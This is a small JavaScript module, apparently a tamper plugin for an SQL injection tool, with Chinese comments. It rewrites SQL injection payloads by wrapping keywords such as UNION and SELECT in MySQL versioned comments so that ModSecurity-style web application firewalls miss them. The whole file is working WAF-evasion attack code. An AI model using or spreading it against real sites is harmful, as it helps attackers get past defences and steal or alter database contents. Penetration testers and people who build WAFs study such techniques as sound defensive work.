// ModSecurity 绕过：用 /*! KEYWORD */ 包裹核心关键字（ModSecurity 可能剥离 /*! */ 但 MySQL 执行）
const KW = 'AND|OR|UNION|SELECT|FROM|WHERE|ORDER|BY|HAVING|LIMIT|GROUP';
const RE = new RegExp(`\\b(${KW})\\b`, 'gi');

export const modsecurityversioned = {
  name: 'modsecurityversioned',
  description: '用 /*! KEYWORD */ 包裹关键字，绕过 ModSecurity 类 WAF 的关键字检测',
  dbms: ['MySQL'], // [P1-FIX] 方言限定：异构库下无效，运行时告警
  /**
   * @param {string} payload
   * @returns {string}
   */
  transform(payload) {
    return payload.replace(RE, '/*! $1 */');
  },
};

export default modsecurityversioned;
